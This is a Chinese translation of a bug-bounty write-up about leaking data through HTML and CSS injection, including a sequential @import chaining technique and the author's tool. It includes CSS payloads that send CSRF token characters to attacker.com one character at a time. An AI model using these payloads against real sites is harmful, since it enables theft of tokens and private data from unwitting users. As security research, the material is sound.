> 原文链接: https://www.anquanke.com//post/id/176565 


# 使用HTML注入进行信息泄露


                                阅读量   
                                **284856**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者d0nut，文章来源：medium.com
                                <br>原文地址：[https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t01db6589d2a181dd6a.png)](https://p1.ssl.qhimg.com/t01db6589d2a181dd6a.png)



本篇文章讲述了我如何发现一个漏洞利用点，并且可以bypass现有安全机制，使我获得5位数赏金。

## 一个奇怪的HTML注入案例

AndréBaptista和Cache-Money正在研究一个非常有趣的漏洞，它最初是一个简单的字符集bypass，经过一系列操作可以使目标（由于dompurify，不能进行XSS）演变成HTML注入。这是一条很棒的利用链，可以证明他们发现了很棒的东西。但如下问题还是让他们遇到了很大的麻烦。

在听到他们取得的进展后，我想去看看我是否能够提供一些帮助来使这个漏洞更具利用性。首先我们确定我们至少能够完成一次有效的点击劫持攻击。0xACB (Andre)和Cache-Money有一个很好的想法，他们试图串联更多的攻击面组成利用链，以创造更大影响力的漏洞。但是我有一些其他的想法。

在我们确定了dompurify默认允许`style`标签之后，我开始思考如何利用CSS做更多的操作而不仅仅只是操纵DOM。如果你已经读过我的一些帖子，你就会知道我对CSS注入漏洞并不陌生。不幸的是，这个页面不仅有框架加载保护，并且需要一些用户交互来触发注入，这导致如果我们想要进行敏感信息泄露，则会浪费很长时间。并且这只是一个低危攻击，最多只能获得4位数的赏金。

我需要一种方法让浏览器在无需重新加载、iframes或用户交互的情况下可以执行多个CSS payload以达成类似的攻击。此外，我们对可以注入的payload的长度进行限制。想要仅仅使用`&lt;style&gt;`标签来利用它似乎是不可能的，直到我开始了解了CSS的一个特性：`[@import](https://github.com/import)`。



## CSS注入入门

在我深入了解这项技术之前，我想用一个简短的部分来描述CSS注入中使用的传统token信息泄露<br>
技术。如果你对这方面已经很熟悉了，可以跳到下一节。另外，我也曾在之前的一篇blog中更深入地探讨了这项技术([https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d)。](https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d)%E3%80%82)

传统的CSS注入token信息泄露技术依赖于一种名为Attribute Selectors的CSS特性。Attribute Selectors允许开发人员指定只有当某个元素的属性满足selector指示的条件时，才可以将该特定样式应用于该元素。我们可以利用attribute selector创建一种规则，该规则仅在特定条件下适用于页面上的指定元素。当应用这些样式时，我们可以使用类似于`background-image`等属性使浏览器与攻击者交互，以循环获取token信息泄露操作的反馈。

```
input[name=csrf][value^=a]`{`
    background-image: url(https://attacker.com/exfil/a);
`}`
input[name=csrf][value^=b]`{`
    background-image: url(https://attacker.com/exfil/b);
`}`
/* ... */
input[name=csrf][value^=9]`{`
    background-image: url(https://attacker.com/exfil/9);   
`}`
```

在这个例子中，我们使浏览器一旦发现CSRF token以`a`开头，则将`background-image`设置为`https://attacker.com/exfil/a`中的图像。然后，我们对可能作为token开头的每个字符(a, b, c, .. 7, 8, 9, etc.)重复此规则。

一旦我们知道token的第一个字符是什么，我们就可以再次执行攻击（通常使用iframes），但需要稍微修改payload。

```
input[name=csrf][value^=ca]`{`
    background-image: url(https://attacker.com/exfil/ca);
`}`
input[name=csrf][value^=cb]`{`
    background-image: url(https://attacker.com/exfil/cb);
`}`
/* ... */
input[name=csrf][value^=c9]`{`
    background-image: url(https://attacker.com/exfil/c9);   
`}`
```

在这个例子中，我们假设CSRF token的第一个字母是一个`c`。如此一来，我们通过再次运行之前的规则就可以获得CSRF token的第二个字符。但这要建立在这些tokens都是以`c`开头的基础上。



## 先决条件

上述技术通常需要三个前提：

1.CSS注入需要允许足够长的payload

2.能够在框架加载页面再次执行CSS新生成的payloads

3.能够引用外部图片（可能被CSP阻止）

这意味着，如果注入不允许足够大的payload，或者页面不能被框架加载，那么前面的技术可能不适用。在我们的例子中，这意味由于存在框架安全机制，以及实际可以注入的字符数量有限，我们无法使用这种技术。



## @import to the Rescue

许多编程语言能够从其他源文件导入代码，CSS也不例外。尽管许多人可能只知道`&lt;link href="..." rel="stylesheet"&gt;`，但实际上CSS本身有一种方法可以使用一种名为`[@import](https://github.com/import)`的at-rule来执行类似（但不同）类型的表单样式包含。

在大多数情况下，`[@import](https://github.com/import)`将提取的样式直接交换到当前样式表中，这使开发人员能够引入外部样式的同时，覆盖那些定义在`[@import](https://github.com/import)`行下的外部资源中的，不被需要的指令。

在某些浏览器（例如Chrome）中实现的此功能将会带来一个有趣的副作用，即可以在外部资源被提取到浏览器的同时处理样式表的其余部分。我的理解是，这种行为增加了页面的TTI，同时试图减少”flashes of unstyled content”（参见FOUC problem），但实际上它在开发中有实际用途。

想象一下，我们有一个网页包含以下样式表：

```
@import url(http://laggysite.com/base.css);
* `{` color: red; `}`
```

Chrome通过3个步骤处理此样式表：

1.向`http://laggysite.com/base.css`发出请求

2.执行剩余指令（apply `* `{` color: red; `}``）

3.当`http://laggysite.com/base.css`返回响应时，将响应代入样式表并重新执行样式表。

当`[@import](https://github.com/import)`目标响应时，我们可以利用浏览器再次执行样式表的行为，模拟以前的技术中从iframes中控制CSS再次执行的能力的行为。我们使用`[@import](https://github.com/import)`的唯一要求是我们必须在`style`标签的开始时拥有控制权（因为这是HTML注入）。

为此，我们将在样式表中创建两个`[@import](https://github.com/import)`规则，并让服务器保持所有连接为打开状态。然后，我们将使用标准的CSS注入token信息泄露payload从目标属性中提取第一个token。当我们的服务器从`background`样式接收到该token后，我们可以生成下一个token信息泄露payload，并使用新生成的payload响应下一个待处理的`[@import](https://github.com/import)`规则。

为了让它变得美观和整洁，我们可以用一个独立、首创的`[@import](https://github.com/import)`规则来解决所有问题（这也帮助我们实现控制payload长度的目的）。

[![](https://p2.ssl.qhimg.com/t01adcc2045aefba380.png)](https://p2.ssl.qhimg.com/t01adcc2045aefba380.png)

为了证明这种攻击是可行的，我创建了一个我称为`sic`（Sequential Import Chaining）的工具。这个名字的灵感来源于`[@import](https://github.com/import)`规则连续的`1 by 1`属性，它们被链接在一起以引起CSS受控的再次执行。

您可以看到一个普通的HTML注入实例，它通过利用`sic`，泄露页面上的`href`。在一个更真实的例子中，攻击者会使用`value`属性提取一些更敏感的东西，例如DOM中的CSRF token。

工具代码如下：

```
https://github.com/d0nutptr/sic
```

通过这项新技术，我们现在能够证明，受害者会在无意识的情况下，很轻易地从当前页面泄露敏感信息，这会极大地增加我们报告的赏金。



## 重新发现

你可以想象，当我看着我的工具（我花了好几个小时的时间）最终完成了它的任务时，我是多么的惊讶和激动。

> <p>我觉得我刚刚为一种漏洞发明了一种新的开发技术。在#h165事件之后，我将写一篇关于如何做到这一点的文章，并把你需要的工具分享给你。<br>
— [@d0nutptr](https://github.com/d0nutptr)</p>

刚开始的时候，当我把这项利用方法展示给所有黑客的时候，他们都表示之前从来没有见到过类似的方法，因此可以确定我是第一个发现此方法的人。但直到我告诉了EdOverflow这个利用方法之后，他才跟我说，有个叫Vila的人在大约半年前就提出了类似的方法。

有趣的是，我试图构建一个与Vila的PoC类似的PoC，但是我无法理解如何递归地链接样式表，同时让浏览器兼容新注入的样式。递归方法要求您为每个新添加的规则添加`additional specificity`，否则浏览器将只考虑样式表中最后一个适用的样式（也恰好是注入页面的第一个样式）。这就是为什么我提出了一种不需要`additional specificity`的利用方法。尽管如此，这两种利用方式使用了相同的核心原则。



## 潜在应用

这项技术应用的范围很广。除了Web应用程序中HTML注入之外，我还做了其他一些尝试，比如我去电子邮件客户端中查看了，是否存在与Chrome相似的情况；然而，Vila提出的建议是在电子应用程序中尝试查找。

> ……这种方法对于电子应用程序中的HTML注入非常有用（攻击者通常没有iframe或可控navigation） —— pepe vila

最后，我对服务端渲染的含义感到非常好奇。或许我可以想象一个PDF生成的例子，在这个例子中，SSRF和javascript的执行都得到了缓解，这或许会导致一种潜在的可能，致使攻击者将注入到该文档中的内容泄露。



## 致谢

最后，我想向下面的人由衷的表达我的感激：<br>
• 0xACB<br>
• cache-money<br>
• shubs<br>
• sean<br>
• ruby<br>
• vila
